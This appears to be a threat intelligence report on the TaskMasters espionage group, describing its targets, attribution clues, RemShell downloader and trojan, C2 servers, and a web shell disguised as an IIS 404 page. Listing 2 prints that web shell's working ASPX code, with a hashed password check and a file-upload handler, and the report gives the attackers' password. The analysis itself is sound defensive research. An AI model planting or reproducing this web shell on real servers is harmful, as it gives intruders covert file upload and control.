Introduction
In the course of cyberincident investigations and threat analysis research, Positive
Technologies experts have identified activity by a criminal group whose aims include
theft of confidential documents and espionage. In this report, we will pay a close look
at the tools, techniques, and procedures employed by the group as well as share indicators of compromise for detecting attacks.

Objectives
The main objective of the group is to steal confidential information. The attackers attempt to burrow into corporate information systems for extended periods and obtain
access to key servers, executive workstations, and business-critical systems.
At one of the attacked companies, the earliest traces of the group's presence on infrastructure dated to 2010. Since the group had obtained full control of some servers and
workstations by that time, the initial breach must have occurred much earlier.
Most of the attacked companies relate to manufacturing and industry. In total we
are aware of compromise of over 30 companies and organizations in various sectors,
including:
 Manufacturing and industry
 Energy
 Government
 Science and technology
 Systems integration

 Software development
 Geology
 Transport and logistics
 Real estate
 Construction

The group attacked companies in a number of countries. A significant number of their
targets were located in Russia and the CIS.

Attribution
Identified by the PT Expert Security Center in 2018, the group used an unusual method
for lateral movement on network infrastructure: creation of tasks in the Task Scheduler.
As a result, the group has been dubbed TaskMasters.
The GitHub code of the ASPXSpy2014 web shell, which was used in the attack process,
contains references to Chinese developers (see Figure 1). However, the version we discovered instead contains a reference to google.ru.

Figure 1. ASPXSpy: public version vs. version used in attack

The requests sent to the web shells contained IP addresses belonging to a hosting provider and printing house in Eastern Europe. However, the event log of the proxy server at
one of the attacked organizations captured the moment when the attackers switched to
the residential Chinese IP address 115.171.23.103. This most likely was caused by a software
VPN going offline during the attack.

Figure 2. Lookup of IP address 115.171.23.103

The attackers used a copy of WinRAR that had been activated with a key widely distributed on Chinese-language web forums.

Figure 3. WinRAR license key published on Chinese-language forums

One of the tasks made use of the domain Brengkolang.com, which had been registered through a Chinese registrar.

Figure 4. Information about Brengkolang.com

Many of the utilities contain error messages and other debugging information in broken English. This would be consistent with English being a second language for the
developers.

Figure 5. Error messages written in broken English

In addition, some of the attackers' self-developed utilities contain the string "by AiMi".
This artifact is present both in client backdoors and server components.

Figure 6. Reference to the developers in script interface

In a previous report, we noted that demand for malware development on the darkweb
significantly exceeds supply.1 As a result, malware is increasingly available to anyone
willing to pay.
Growing malware supply has pushed cybercriminals to use ready-made tools, which
significantly complicate attack attribution.

5

If different cybercriminals use the same services, they could be mistakenly thought to
be in the same group. The same problem applies to determining the attackers' country.
Code comments in any particular language only mean that the malware was created by
a speaker of that language, who may have sold it afterward. Phishing messages, which
may have been written sloppily, are also problematic for attribution. The bottom line
is that surefire identification is possible only when attackers use exclusive exploits and
malware.

Methods
The overall attack vector is rather traditional. After reaching the local network, the attackers study the infrastructure, exploit system vulnerabilities (such as CVE-2017-0176),
and then download a particular toolkit to compromised hosts and unpack it (we will
call the toolkit TaskMasters, the same name as for the group itself). With this toolkit,
they search for, copy, and archive files of interest. The files are then sent to command
and control (C2) servers.
For lateral movement on the network, the attackers run system commands on remote
hosts via the AtNow utility, which enables running software and commands at preset
intervals of time. For managing hosts, they use small backdoors, which are used to
connect to C2 servers. Backup communication methods exist as well, in the form of
web shells on external resources (such as an Exchange server).

The group uses Dynamic DNS infrastructure for its domains. It also makes active use of
supply chain attacks.
To scan the network and compromise systems, the attackers use both software available
freely online (such as NBTScan, pwdump, and Mimikatz) and custom-developed utilities.
At this point, we will proceed to describe the TaskMasters arsenal in more detail.

Tools
The following tables are a compilation of information about software used by the
group. Utilities developed by the group itself have been listed in a separate table.

Technical details
RemShell
The main software used by the TaskMasters group, RemShell controls infected hosts
and consists of two components:
 RemShell Downloader (downloader)
 RemShell (main functionality)
Let's look closely at each component.
RemShell Downloader
This component delivers the main payload to the target system. A flowchart illustrating
the downloader's operation is given in Figure 8.
The downloader accesses an HTML page (the address is set in the downloader's code)
and reads the Attribute value of the html tag (see Figure 9). This value is then decrypted.
Depending on the value, the downloader either switches to sleep mode or saves the PE
file to disk and launches it. The PE file is the payload, containing the main RemShell Trojan.

Figure 8. RemShell Downloader flowchart

Figure 9. Example HTML file

The downloader contains a string used for comparison purposes, in order to search for
the fragment in the HTML source with the Attribute value (see Figure 10).

Figure 10. Substring in HTML file for search purposes

We also analyzed the payload encryption process. It consists of four stages:
1. Key preparation (RC4KeyPrepare), with each byte XORed against a constant string.
2. Base64 encoding.
3. RC4 encryption.
4. ZLIB compression.
In the downloader code, inside the entry for the RC4 key used for decryption, our experts uncovered friendly wishes from the developers (see Figure 11).

Figure 11. RC4 key

RemShell
As the main malware used to control infected hosts, RemShell offers attackers several
capabilities:
1. Remote control via cmd shell.
2. Downloading of files to remote host.
3. Uploading of files from remote host to C2 server.
Note that the malware has two C2 servers. The first C2 server acts as a middleman
or proxy that, when requested by the malware, provides the address of the main C2
server. The first C2 server can also send the command to hand off the malware to the
other C2 proxy server. Since all changes occur in memory, after a restart the malware
will contact the C2 proxy server whose address is indicated in the malware code. Note
that the malware will stop working until it receives the address of the main C2 server
(see Figure 12).

Figure 12. Handoff from the first C2 server to the main C2 server

We found a number of variations of the malware. For example, some variations lacked the
command to upload files from a host to the C2 server. In these cases, the attackers used a
custom-developed utility to exfiltrate files. Other variations had commands added to enumerate running processes and kill processes by PID (process ID).

10

Configuration data (such as address of the C2 proxy server, port, and user agent) was encrypted with RC4 and specified in the form of constants in the malware code (see Figure 13).

Figure 13. Generation of the key used for network interaction
and decryption of configuration data

Traffic between C2 servers and the malware was encrypted with RC4 and additionally
encoded with Base64. The RC4 key is generated by calculating an MD5 hash from a
constant string. The output of commands from the C2 server is sent as an HTTP request
to a URL with the atypical prefix "1111".
The malware also contains a heartbeat mechanism: at random intervals, the malware
sends an HTTP request that contains the output of the hostname command to the
specified URL address, with the atypical prefix "0000" (see Figure 14).

Figure 14. Heartbeat

11

C2 servers
The server for managing malware infections consists of console ELF files. Figure 15 shows
the main loop from the server code, with original function names intact.

Figure 15. Main loop of TaskMasters server code

The interface for server management is implemented as a web shell, supporting the
commands listed in Figure 16.

Figure 16. Reference list of server commands

The server keeps a detailed log of all commands sent to the remote host. The log files
are stored on disk in encrypted form. Encryption of the log files uses the RC4 algorithm
(see Figure 17).

Figure 17. Writing to log file

12

404-Input-shell web shell
The window for logging in to the web shell is disguised as a standard IIS 404 error page.
To access the command line and run commands, the attacker must first enter the password. The field for entering the password is hidden: viewing it requires double-clicking
the word Back.

Figure 18. Error 404 web shell (with hidden password entry form)

Listing 1. Event code for displaying the password entry field

Click the <a href="#" ondblclick ="history_back()">Back</a> button to try another link.</li>

13

Figure 19. Error 404 web shell (with visible password entry form)

The attackers logged in with the password 0p;/9ol., which is the same password
they used for encrypting archives. The web shell code contains the MD5 hash of this
password.
Listing 2. Code of the Error 404 web shell

<script runat="server">protected void Check(object sender,EventArgs e)
{if(FormsAuthentication.HashPasswordForStoringInConfigFile(Request.
Form["key"],"MD5").ToLower() != " 3ab32b47a7dcb67c6d8943ff04254c1e "){Login.
Visible=false;return;}table1.Visible=false;Info.Visible=true;}
protected void
GetInfo(object sender,EventArgs e){Response.Write(Path.Combine(Server.MapPath(""),
Path.GetFileName(Lable_File.Value)));try{if(Lable_File.PostedFile.FileName=="")
{Response.Write("No file to upload");}else{Lable_File.PostedFile.SaveAs(Path.
Combine(Server.MapPath(" "), Path.GetFileName(Lable_File.Value)));Response.Write("
upload success!");}}catch(Exception ex){if(ex.InnerException==null){Response.Write(ex.
Message);}else{Response.Write(ex.ToString());}}}</script>

In our investigations, we uncovered a total of three modifications of this web shell with
differing functionality, as illustrated in the following screenshots.

Conclusion
Our findings confirm that cyberthreats are a real danger for companies across the board,
not just banks and financial institutions. In cases such as those outlined here, attackers
are motivated not by financial gain, but by access to data and control of information flows.
The priority of attackers in these espionage campaigns was long-term stealth on target
infrastructure. Victims are usually unaware that they have been attacked. They tend
to not have protection systems or skilled security professionals in place, and because
there are no "red flags" indicating compromise (theft of funds, encrypted hard disks,
ransom demands, or clear losses to the business), the cyberincident remains unnoticed.
To determine how to protect systems—and most importantly, from whom—incident
investigators must carefully consider and analyze the techniques used. When gauging
potency, it can be more useful to look at attackers' mistakes (within the target infrastructure) than at their toolkit. Unfortunately, not all companies are prepared in case
of a hack or major incident to perform an investigation and round up all artifacts, reconstruct the kill chain, and analyze the actions of attackers on infrastructure. But in
the hands of a highly qualified team with the capacity to make recommendations for
infrastructure protection, incident investigation can have a two-fold benefit: the company's level of protection is improved and future attackers will have to contend with a
hardened target environment.
